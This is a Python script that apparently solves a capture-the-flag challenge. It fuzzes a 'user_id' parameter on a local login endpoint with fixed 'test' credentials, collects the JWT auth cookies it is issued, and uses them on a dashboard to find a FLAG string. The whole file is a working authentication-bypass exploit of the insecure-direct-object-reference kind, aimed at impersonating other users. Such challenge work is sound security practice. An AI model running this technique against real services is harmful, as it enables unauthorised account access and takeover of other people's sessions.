import requests
import re
from urllib.parse import urljoin

BASE_URL = "http://127.0.0.1:32883"
PASSWORD_TEST_URL = urljoin(BASE_URL, "/password/test")
DASHBOARD_URL = urljoin(BASE_URL, "/dashboard")

# Define fuzzing ranges
fuzzing_ranges = [
    ("Sequential around known ID", range(10000, 10101)),  # 10000-10100
    ("Low range", range(1, 51)),  # 1-50
    ("Special values", [0, -1, 999, 9999, 99999])
]

def extract_jwt_token(response):
    """Extract JWT token from Set-Cookie header or cookies"""
    if 'Set-Cookie' in response.headers:
        match = re.search(r'auth_token=([^;]+)', response.headers['Set-Cookie'])
        if match:
            return match.group(1)
    
    if 'auth_token' in response.cookies:
        return response.cookies['auth_token']
    
    return None

def check_authentication(user_id):
    """Test authentication with given user_id"""
    try:
        data = {
            'username': 'test',
            'password': 'test',
            'user_id': str(user_id)
        }
        
        response = requests.post(
            PASSWORD_TEST_URL,
            data=data,
            allow_redirects=False,
            timeout=5
        )
        
        # Check for successful authentication (302 redirect or Set-Cookie)
        if response.status_code == 302 or 'Set-Cookie' in response.headers:
            jwt_token = extract_jwt_token(response)
            return True, jwt_token, response
        
        return False, None, response
    
    except requests.exceptions.Timeout:
        return False, None, None
    except Exception as e:
        print(f"[ERROR] user_id={user_id}: {str(e)}")
        return False, None, None

def check_dashboard(jwt_token):
    """Access dashboard with JWT token and check for FLAG"""
    try:
        cookies = {'auth_token': jwt_token}
        response = requests.get(
            DASHBOARD_URL,
            cookies=cookies,
            timeout=5
        )
        
        # Search for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        
        return response, flag_match
    
    except Exception as e:
        print(f"[ERROR] Dashboard access failed: {str(e)}")
        return None, None

def main():
    print("[*] Starting systematic ID fuzzing attack")
    print(f"[*] Target: {PASSWORD_TEST_URL}")
    print(f"[*] Dashboard: {DASHBOARD_URL}\n")
    
    total_attempts = 0
    successful_auths = []
    flags_found = []
    
    for range_name, id_range in fuzzing_ranges:
        print(f"\n[*] Testing {range_name}")
        print("=" * 60)
        
        for user_id in id_range:
            total_attempts += 1
            
            # Progress update every 20 attempts
            if total_attempts % 20 == 0:
                print(f"[PROGRESS] Tested {total_attempts} user_ids, {len(successful_auths)} successful authentications")
            
            # Test authentication
            is_auth_success, jwt_token, auth_response = check_authentication(user_id)
            
            if is_auth_success and jwt_token:
                print(f"\n[+] SUCCESSFUL AUTH: user_id={user_id}")
                print(f"    Status: {auth_response.status_code}")
                print(f"    JWT Token: {jwt_token[:50]}...")
                
                successful_auths.append({
                    'user_id': user_id,
                    'jwt_token': jwt_token
                })
                
                # Check dashboard for FLAG
                dashboard_response, flag_match = check_dashboard(jwt_token)
                
                if dashboard_response:
                    print(f"    Dashboard Status: {dashboard_response.status_code}")
                    print(f"    Dashboard Length: {len(dashboard_response.text)}B")
                    
                    if flag_match:
                        flag_value = flag_match.group(0)
                        print(f"\n{'='*60}")
                        print(f"[!] FLAG FOUND at user_id={user_id}")
                        print(f"[!] FLAG: {flag_value}")
                        print(f"{'='*60}")
                        print(f"\n[+] Full Dashboard Response:")
                        print(dashboard_response.text)
                        print(f"\n{'='*60}\n")
                        
                        flags_found.append({
                            'user_id': user_id,
                            'flag': flag_value,
                            'dashboard_content': dashboard_response.text
                        })
                        
                        # Stop immediately if flag found
                        print(f"[*] Stopping search - FLAG found!")
                        return flags_found
                    else:
                        # Print dashboard snippet for analysis
                        snippet = dashboard_response.text[:300]
                        print(f"    Dashboard snippet: {snippet}...")
    
    # Final summary
    print(f"\n{'='*60}")
    print(f"[SUMMARY]")
    print(f"Total attempts: {total_attempts}")
    print(f"Successful authentications: {len(successful_auths)}")
    print(f"Flags found: {len(flags_found)}")
    
    if successful_auths:
        print(f"\n[+] Valid user_ids:")
        for auth in successful_auths:
            print(f"    - user_id={auth['user_id']}")
    
    if flags_found:
        print(f"\n[!] FLAGS FOUND:")
        for flag_info in flags_found:
            print(f"    - user_id={flag_info['user_id']}: {flag_info['flag']}")
    else:
        print(f"\n[-] No flags found in tested ranges")
    
    return flags_found

if __name__ == "__main__":
    results = main()

